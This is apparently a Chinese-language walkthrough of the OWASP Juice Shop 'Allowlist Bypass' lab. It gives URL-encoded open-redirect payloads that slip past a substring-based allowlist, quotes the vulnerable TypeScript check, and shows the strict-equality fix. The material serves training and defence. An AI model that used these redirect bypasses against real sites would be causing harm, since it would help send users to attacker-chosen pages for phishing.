---
title: Allowlist Bypass
description: pass
---

- 描述：强制重定向到一个你不应该重定向的页面。
- 将之前挑战中的其中一个重定向 URL 作为基准
    ```http://127.0.0.1:3000/redirect?to=http://leanpub.com/juice-shop```
    或在 ```main.js``` 中搜索 ```redirect```
- 尝试删除基准重定向 URL 的部分
    ```/redirect?to=http://leanpub.com/```
    响应为
    ```406 Error: Unrecognized target URL for redirect: http://leanpub.com/```
- 尝试添加路径，可成功重定向
    ```/redirect?to=http://leanpub.com/juice-shop/foo```
- 此处使用 Burp 的 URL 绕过速查表，设置后将其内容复制为攻击器的载荷，成功的载荷为：
    - ```http%3a%2f%2fportswigger%2enet%3fhttp%3a%2f%2fleanpub%2ecom%2fjuice-shop%2f```
    解码后
    ```http://portswigger.net?http://leanpub.com/juice-shop/```
    - ```0%3a%2f%2fportswigger%2enet%3a80%3bhttp%3a%2f%2fleanpub%2ecom%2fjuice-shop%3a80%2f```
    解码后
    ```0://portswigger.net:80;http://leanpub.com/juice-shop:80/```
- 基于成功载荷，编码后，将 ```?``` 改为 ```#``` 也同样有效
    ```http://portswigger.net#http://leanpub.com/juice-shop/```
> 移除 to 参数 ```http://localhost:3000/redirect```  将会得到一个 500 TypeError: Cannot read property 'indexOf' of undefined ，其中 indexOf 表示 allowlist 工作方式存在严重缺陷。
- 或许对应代码挑战中的```includes```方法
- 代码挑战：
    ```typescript
    export const redirectAllowlist = new Set([
	  'https://github.com/juice-shop/juice-shop',
	  'https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm',
	  'https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW',
	  'https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6',
	  'http://shop.spreadshirt.com/juiceshop',
	  'http://shop.spreadshirt.de/juiceshop',
	  'https://www.stickeryou.com/products/owasp-juice-shop/794',
	  'http://leanpub.com/juice-shop'
	])
	 
	export const isRedirectAllowed = (url: string) => {
	  let allowed = false
	  for (const allowedUrl of redirectAllowlist) {
	    allowed = allowed || url.includes(allowedUrl)
	  }
	  return allowed
	}
    ```
    - 漏洞在于仅确认是否包含
        ```typescript
        allowed = allowed || url.includes(allowedUrl)
        ```
    - 修复：改为严格相等
        ```typescript
        allowed = allowed || url === allowedUrl
        ```
        > 使用 indexOf 允许任何包含任何允许列表中的 URL 的 URL，即使它只是一个参数。用实际的相等性检查替换它，可以缓解这个问题，并使重定向仅适用于允许列表中的 URL。